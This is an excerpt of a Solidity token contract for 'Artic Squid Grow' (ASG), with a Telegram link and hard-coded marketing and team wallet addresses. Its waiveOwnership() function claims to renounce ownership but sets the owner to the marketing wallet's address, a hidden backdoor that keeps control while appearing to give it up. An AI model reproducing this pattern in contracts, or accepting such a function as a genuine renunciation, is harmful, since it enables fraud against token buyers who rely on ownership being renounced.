...
/*
Telegram : https://t.me/ArticSquidGrow
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x50DB7d4956b73cC08676D9eE511AF7058A47437d);
    }
...
contract ArticSquidGrow is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Artic Squid Grow";
    string private _symbol = "ASG";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x50DB7d4956b73cC08676D9eE511AF7058A47437d);
    address payable public teamWalletAddress = payable(0xF484625f9194275D7D1de8B810b4116d41A2C3C7);
